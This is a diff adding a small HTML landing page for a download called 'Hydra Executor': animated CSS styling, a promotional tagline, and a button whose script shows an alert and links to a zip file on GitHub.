@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hydra Executor</title>
+    <style>
+        /* General Styles */
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #1d1f21, #3a3d40);
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+            color: #fff;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.5);
+            animation: fadeInUp 1s ease-out;
+        }
+
+        /* Title Animation */
+        .title {
+            font-size: 3rem;
+            font-weight: bold;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.7);
+            color: #34e89e;
+            background: linear-gradient(90deg, #34e89e, #0f3443);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: zoomIn 1.5s ease-in-out;
+        }
+        
+        .description {
+            font-size: 1.2rem;
+            margin: 15px 0;
+            animation: slideIn 1s ease-out;
+        }
+
+        /* Button Animation */
+        .button {
+            padding: 10px 30px;
+            font-size: 1rem;
+            color: #fff;
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            animation: bounceIn 1.2s ease-in-out;
+        }
+
+        .button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(255, 75, 43, 0.7);
+        }
+
+        .button:active {
+            transform: scale(1.05);
+            box-shadow: 0 4px 15px rgba(255, 75, 43, 0.5);
+        }
+
+        /* Animations */
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes zoomIn {
+            0% {
+                opacity: 0;
+                transform: scale(0.8);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            50% {
+                transform: scale(1.1);
+                opacity: 1;
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">Hydra Executor</div>
+        <p class="description">The Best Executor For You!. Reliable, Fast, Secure and Trustable.</p>
+        <button class="button" onclick="downloadFile()">Download</button>
+    </div>
+    <script>
+        function downloadFile() {
+            alert('Downloading Hydra!!!! press ok to continue');
+            // Replace the link below with your actual download file URL
+            window.location.href = "https://github.com/sinci12/hydra/releases/download/hydra/Hydra.zip";
+        }
+    </script>
+</body>
+</html>
